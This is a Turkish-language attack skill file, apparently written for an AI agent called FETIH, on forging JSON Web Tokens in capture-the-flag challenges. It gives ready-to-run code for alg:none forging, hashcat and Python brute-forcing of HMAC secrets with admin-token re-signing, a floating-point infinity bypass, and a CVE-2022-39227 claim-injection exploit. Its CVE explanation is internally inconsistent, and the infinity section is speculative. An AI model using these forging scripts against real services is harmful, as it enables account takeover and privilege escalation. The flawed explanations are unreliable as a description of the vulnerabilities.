---
name: jwt-attacks
description: JWT saldırıları — alg:none, HMAC brute-force, floating point bypass, CVE-2022-39227
tags: [ctf, crypto, web, jwt, alg-none, hmac, brute-force, token-forgery]
triggers:
  - "JWT token"
  - "eyJ ile başlayan token"
  - "algorithm none"
  - "HS256 secret"
  - "token forge"
  - "admin JWT"
  - "python-jwt"
  - "hashcat 16500"
difficulty: medium
category: crypto
solved_challenges:
  - "LACTF 2024 - jason-web-token (floating point infinity)"
  - "WolvCTF 2024 - Username (hashcat brute)"
  - "HTB Cyber Apocalypse 2024 - LockTalk (CVE-2022-39227)"
  - "LINE CTF 2024 - jalyboy baby (alg:none)"
adapted_for: fetih
---

# JWT Saldırıları

JWT (JSON Web Token) formatı: `base64url(header).base64url(payload).signature`

## Ne Zaman Kullan

- Challenge'da `eyJ` ile başlayan bir token varsa (base64url encoded JSON header)
- Cookie veya Authorization header'da JWT görürsen
- "admin", "role", "user" gibi claim'ler içeren token forge etmen gerekiyorsa
- Kaynak kodda `python-jwt`, `pyjwt`, `jsonwebtoken` kütüphaneleri görürsen
- "Invalid signature", "Token expired" gibi mesajlar alıyorsan

### Hızlı Kontrol
```bash
# Token'ı decode et (imza doğrulaması olmadan)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciJ9.xxx" | cut -d'.' -f1 | base64 -d 2>/dev/null
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciJ9.xxx" | cut -d'.' -f2 | base64 -d 2>/dev/null
```

---

## Saldırı 1: alg:none (Algoritma Bypass)

### Nasıl Çalışır

JWT kütüphanesi `alg` değerini körü körüne güvenirse, `"alg":"none"` yaparak imzayı tamamen atlayabiliriz. Header'da algoritma `none` olduğunda kütüphane imza doğrulaması yapmaz, boş imzayı kabul eder.

### LINE CTF 2024 - jalyboy baby Örneği

Hedef: `sub` claim'ini `admin` yap, imzayı geçer kıl.

```python
import base64
import json

def b64url_encode(data: bytes) -> str:
    """Padding olmadan base64url encode."""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(s: str) -> bytes:
    """Padding ekleyerek base64url decode."""
    padding = 4 - len(s) % 4
    if padding != 4:
        s += '=' * padding
    return base64.urlsafe_b64decode(s)

def forge_alg_none(original_token: str, new_claims: dict) -> str:
    """
    alg:none saldırısı ile yeni claim'ler içeren token üret.
    
    Args:
        original_token: Orijinal geçerli JWT
        new_claims: İstenen claim değerleri (örn: {"sub": "admin", "role": "admin"})
    
    Returns:
        Forge edilmiş JWT token
    """
    parts = original_token.split('.')
    
    # Orijinal payload'u decode et
    original_payload = json.loads(b64url_decode(parts[1]))
    print(f"[*] Orijinal payload: {original_payload}")
    
    # Payload'u güncelle
    original_payload.update(new_claims)
    print(f"[*] Yeni payload: {original_payload}")
    
    # Header'ı alg:none yap
    new_header = {"alg": "none", "typ": "JWT"}
    
    # Yeni token'ı oluştur (imza boş)
    header_encoded = b64url_encode(json.dumps(new_header, separators=(',', ':')).encode())
    payload_encoded = b64url_encode(json.dumps(original_payload, separators=(',', ':')).encode())
    
    # alg:none tokenında imza bölümü boş string olmalı
    forged = f"{header_encoded}.{payload_encoded}."
    
    print(f"[+] Forge edilmiş token: {forged}")
    return forged

# Kullanım
original = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwicm9sZSI6InVzZXIifQ.SIGNATURE"
token = forge_alg_none(original, {"sub": "admin", "role": "admin"})
```

### Varyasyonlar: "None" Yazım Farklılıkları

Bazı kütüphaneler sadece küçük harf `none` kontrol eder. Dene:
- `"alg": "None"`
- `"alg": "NONE"`
- `"alg": "nOnE"`

```python
for alg_variant in ["none", "None", "NONE", "nOnE", "NoNe"]:
    header = {"alg": alg_variant, "typ": "JWT"}
    # ... aynı forge işlemi
```

---

## Saldırı 2: HMAC Secret Brute-Force

### Nasıl Çalışır

JWT `HS256` algoritmasıyla imzalanmışsa, secret zayıf bir kelimeyse brute-force ile kırılabilir. Secret bulununca istenen payload ile geçerli token üretilir.

### Hashcat ile Kırma (Önerilen Yöntem)

```bash
# Token'ı dosyaya kaydet (tek satır, tam token)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciJ9.ABCDEF" > jwt.txt

# Rockyou wordlist ile kır (-m 16500 = JWT modu)
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --show

# Kısa secretlar için brute-force (1-6 karakter, küçük harf + rakam)
hashcat -m 16500 jwt.txt -a 3 "?l?l?l?l?l" --increment --increment-min 1

# Özel charset ile (lowercase + digit, max 5 karakter)
hashcat -m 16500 jwt.txt -a 3 -1 "abcdefghijklmnopqrstuvwxyz0123456789" "?1?1?1?1?1"

# Kırılan secret'ı göster
hashcat -m 16500 jwt.txt --show
```

### WolvCTF 2024 - Username Örneği

Secret `mstzt` (5 karakter, sadece küçük harf) idi. Hashcat ile dakikalar içinde kırıldı.

```bash
hashcat -m 16500 wolv_jwt.txt -a 3 "?l?l?l?l?l"
# Çıktı: ...token...:mstzt
```

### Python ile Manuel Brute-Force

```python
import hmac
import hashlib
import base64
import json
import itertools
import string

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(s: str) -> bytes:
    padding = 4 - len(s) % 4
    if padding != 4:
        s += '=' * padding
    return base64.urlsafe_b64decode(s)

def verify_jwt_secret(token: str, secret: str) -> bool:
    """Verilen secret ile JWT imzasını doğrula."""
    parts = token.split('.')
    if len(parts) != 3:
        return False
    
    message = f"{parts[0]}.{parts[1]}".encode()
    expected_sig = b64url_decode(parts[2])
    
    actual_sig = hmac.new(secret.encode(), message, hashlib.sha256).digest()
    return hmac.compare_digest(expected_sig, actual_sig)

def brute_force_jwt(token: str, wordlist_path: str = None, max_len: int = 6) -> str | None:
    """
    JWT secret'ı wordlist veya brute-force ile bul.
    
    Returns:
        Bulunan secret veya None
    """
    # Önce wordlist dene
    if wordlist_path:
        print(f"[*] Wordlist deneniyor: {wordlist_path}")
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                for i, line in enumerate(f):
                    secret = line.strip()
                    if verify_jwt_secret(token, secret):
                        print(f"[+] Secret bulundu: {secret} ({i} satırda)")
                        return secret
                    if i % 100000 == 0:
                        print(f"[*] {i} denendi...")
        except FileNotFoundError:
            print(f"[-] Wordlist bulunamadı: {wordlist_path}")
    
    # Brute-force (kısa secretlar için)
    charset = string.ascii_lowercase + string.digits
    print(f"[*] Brute-force başlıyor (max {max_len} karakter, charset: {charset})")
    
    for length in range(1, max_len + 1):
        print(f"[*] {length} karakter deneniyor...")
        for combo in itertools.product(charset, repeat=length):
            secret = ''.join(combo)
            if verify_jwt_secret(token, secret):
                print(f"[+] Secret bulundu: {secret}")
                return secret
    
    print("[-] Secret bulunamadı")
    return None

def forge_with_secret(secret: str, new_payload: dict, alg: str = "HS256") -> str:
    """Bilinen secret ile yeni payload içeren geçerli JWT üret."""
    header = {"alg": alg, "typ": "JWT"}
    header_enc = b64url_encode(json.dumps(header, separators=(',', ':')).encode())
    payload_enc = b64url_encode(json.dumps(new_payload, separators=(',', ':')).encode())
    
    message = f"{header_enc}.{payload_enc}".encode()
    signature = hmac.new(secret.encode(), message, hashlib.sha256).digest()
    sig_enc = b64url_encode(signature)
    
    return f"{header_enc}.{payload_enc}.{sig_enc}"

# Kullanım
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciJ9.SIGNATURE"
secret = brute_force_jwt(token, "/usr/share/wordlists/rockyou.txt")

if secret:
    admin_token = forge_with_secret(secret, {"role": "admin", "sub": "admin"})
    print(f"[+] Admin token: {admin_token}")
```

---

## Saldırı 3: Floating Point Infinity (LACTF 2024 - jason-web-token)

### Nasıl Çalışır

Python'da `float("inf")` veya `1e309` değeri `infinity`'e dönüşür. Eğer server tarafı JWT doğrulaması şöyleyse:

```python
# Zafiyetli kod
salted_secret = float(age) * SECRET_VALUE
if salted_secret == provided_secret:
    grant_access()
```

`age = 1e309` → `float("1e309") = inf` → `inf * herhangi_bir_sayi = inf` → Karşılaştırma her zaman `True` olur (eğer `provided_secret` de `inf` ise).

### LACTF 2024 Tam Çözümü

```python
import base64
import json
import hmac
import hashlib
import requests

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(s: str) -> bytes:
    padding = 4 - len(s) % 4
    if padding != 4:
        s += '=' * padding
    return base64.urlsafe_b64decode(s)

# 1. Adım: Normal kayıt ol ve token al
session = requests.Session()
BASE_URL = "http://challenge.lactf.uclaacm.com:PORT"

resp = session.post(f"{BASE_URL}/register", json={"username": "testuser", "age": 25})
token = resp.json()["token"]
print(f"[*] Normal token alındı: {token}")

# 2. Adım: Token'ı incele
parts = token.split('.')
payload = json.loads(b64url_decode(parts[1]))
print(f"[*] Payload: {payload}")
# Örn: {"username": "testuser", "age": 25, "iat": 1234567890}

# 3. Adım: age değerini infinity yaparak yeni token üret
# Challenge'da secret, age'e dayalı türetiliyordu
# age = 1e309 → Python'da inf olur → salted_secret her zaman inf

# Önce mevcut secret ile token imzalanmış mı kontrol et
# (Çoğu zaman secret bilinmez; ama floating point bypass farklı çalışır)

# Challenge'ın özel mantığı:
# server.py: secret_key = str(age * MAGIC_NUMBER) 
# age=inf → secret_key = "inf" → biz de "inf" ile imzalayabiliriz!

def forge_infinity_token(original_token: str) -> str:
    parts = original_token.split('.')
    original_payload = json.loads(b64url_decode(parts[1]))
    
    # age'i infinity yapan değer
    new_payload = original_payload.copy()
    new_payload["age"] = 1e309  # Python bunu JSON'da "Infinity" olarak serileştirebilir
    
    # Ama JSON standardında Infinity geçersiz, bu yüzden string trick kullan:
    # Bazı challenge'larda float("inf") JSON serialize edilince "Infinity" olur
    # Server bunu float'a çevirince inf * MAGIC = inf → "inf" secret key
    
    # Secret key artık "inf" (veya "Infinity") - bunu kullanarak imzala
    secret_key = "inf"  # Server'ın ürettiği key
    
    header_enc = parts[0]  # Header değişmeden kalır (HS256)
    payload_enc = b64url_encode(json.dumps(new_payload, separators=(',', ':'), 
                                           allow_nan=True).encode())
    
    message = f"{header_enc}.{payload_enc}".encode()
    sig = hmac.new(secret_key.encode(), message, hashlib.sha256).digest()
    
    return f"{header_enc}.{payload_enc}.{b64url_encode(sig)}"

# 4. Adım: Admin erişimi dene
forged = forge_infinity_token(token)
resp = session.get(f"{BASE_URL}/flag", headers={"Authorization": f"Bearer {forged}"})
print(f"[+] Sonuç: {resp.text}")
```

### Temel Fikir

```python
# Python floating point davranışı
>>> float("1e309")
inf
>>> import math
>>> math.isinf(float("1e309"))
True
>>> float("1e309") * 99999
inf
>>> float("1e309") * 0.001  
inf
>>> str(float("1e309") * 12345)
'inf'
# Yani server hangi MAGIC_NUMBER kullanırsa kullansın, sonuç "inf" string'i olur
```

---

## Saldırı 4: CVE-2022-39227 (python-jwt < 3.3.4)

### Zafiyet Nedir

`python-jwt` kütüphanesinin 3.3.4 öncesi sürümlerinde, imzalanmış bir token'ın claim'leri değiştirilebilir ancak orijinal imza hâlâ geçerli sayılır. "Signature reuse" + "claim injection" zafiyeti.

### HTB Cyber Apocalypse 2024 - LockTalk Örneği

```python
# Hedef: guest token alıp administrator yetkisi kazan
# Kullanılan versiyon: python-jwt 3.3.2 (zafiyetli)

import json
import base64
import re
import requests

def exploit_cve_2022_39227(token: str, injected_claims: dict) -> str:
    """
    CVE-2022-39227: python-jwt'de claim injection.
    
    Zafiyetin özeti:
    - python-jwt token'ı parse ederken önce header/payload'u base64 decode eder
    - Sonra JSON'u parse eder ve "en dıştaki" JSON key'lerini alır
    - Eğer payload içine ek JSON objesi enjekte edersek, python-jwt bunu parse eder
    - Ama imzayı orijinal (iç) payload üzerinden doğrular → imza geçerli kalır!
    
    PoC: https://github.com/user0x1337/CVE-2022-39227
    """
    
    parts = token.split('.')
    header = parts[0]
    payload_b64 = parts[1]
    signature = parts[2]
    
    # Orijinal payload'u decode et
    padding = 4 - len(payload_b64) % 4
    if padding != 4:
        payload_b64_padded = payload_b64 + '=' * padding
    else:
        payload_b64_padded = payload_b64
    
    original_payload = json.loads(base64.urlsafe_b64decode(payload_b64_padded))
    print(f"[*] Orijinal payload: {original_payload}")
    
    # Yeni payload'u oluştur
    # Trick: JSON'u wrap ederek enjekte et
    # {"original_key": "original_val", " INJECTED": {"role": "administrator"}}
    # python-jwt bunu parse edince INJECTED key'ini görür ama imzayı orijinal üzerinden doğrular
    
    injected_part = json.dumps(injected_claims, separators=(',', ':'))
    
    # Orijinal JSON'u string olarak manipüle et
    original_json = json.dumps(original_payload, separators=(',', ':'))
    
    # Son } kaldır ve enjekte edilecek claim'i ekle
    # Örnek: {"role":"guest"} → {"role":"guest", "role":"administrator"}
    # python-jwt son değeri alır
    modified_json = original_json[:-1] + ',' + injected_part[1:]
    
    print(f"[*] Manipüle edilmiş JSON: {modified_json}")
    
    # Yeni payload'u encode et
    new_payload_b64 = base64.urlsafe_b64encode(modified_json.encode()).rstrip(b'=').decode()
    
    # Orijinal imzayı kullan (CVE: imza hâlâ geçerli!)
    new_token = f"{header}.{new_payload_b64}.{signature}"
    
    print(f"[+] CVE-2022-39227 exploit token: {new_token}")
    return new_token

# HTB LockTalk örneği
BASE_URL = "http://94.237.x.x:PORT"

# 1. Guest token al
resp = requests.get(f"{BASE_URL}/api/v1/get_token")
guest_token = resp.json()["token"]
print(f"[*] Guest token: {guest_token}")

# 2. CVE exploit ile administrator claim enjekte et
admin_token = exploit_cve_2022_39227(
    guest_token, 
    {"role": "administrator"}
)

# 3. Flag al
resp = requests.get(
    f"{BASE_URL}/api/v1/flag",
    headers={"Authorization": f"Bearer {admin_token}"}
)
print(f"[+] Flag: {resp.text}")
```

### CVE-2022-39227 Otomatik PoC Script

```bash
# GitHub PoC klon
git clone https://github.com/user0x1337/CVE-2022-39227
cd CVE-2022-39227

# Kullanım
python3 cve_2022_39227.py -j "GUEST_JWT_TOKEN" -i "role=administrator"
```

### Hangi Sürümler Etkilenmiş

```python
# requirements.txt veya pip show ile kontrol et
pip show python-jwt
# Version: 3.3.2 → ZAFİYETLİ
# Version: 3.3.4 → Güvenli (patch uygulanmış)
```

---

## Tuzaklar

### 1. Base64 Padding Sorunları

JWT base64url encoding'de padding (`=`) kullanmaz. Decode ederken padding eklemen gerekir.

```python
# YANLIŞ: Direkt decode
base64.b64decode(part)  # Hata verebilir

# DOĞRU: Padding ekle
def b64url_decode(s):
    s += '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)
```

### 2. HS256 vs RS256 Karıştırma

Asimetrik algoritmada (RS256) private key yoksa alg:none dışında saldırı zordur. Ama bazı kütüphanelerde RS256 → HS256 geçişi yapılabilir (public key secret olarak kullanılır).

### 3. "exp" Claim Süresi Dolmuş

Token'ı forge ederken `exp` değerini geleceğe set et.

```python
import time
payload["exp"] = int(time.time()) + 86400  # 1 gün sonra
```

### 4. JSON Key Sırası

Bazı kütüphaneler JSON serialize ederken key sırasına duyarlıdır. İmza doğrulayamazsan orijinal byte sırasını koru.

### 5. Hızlı Referans

| Durum | Saldırı |
|-------|---------|
| Algoritma kontrol edilmiyor | alg:none |
| Zayıf HMAC secret | Hashcat -m 16500 |
| Age/değer matematiksel hesap | Floating point (inf) |
| python-jwt < 3.3.4 | CVE-2022-39227 |
| RS256, public key biliniyor | HS256'ya geç, public key ile imzala |
| `kid` parametresi var | SQL injection / path traversal |

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: 71edbdf1130f6f32
-->

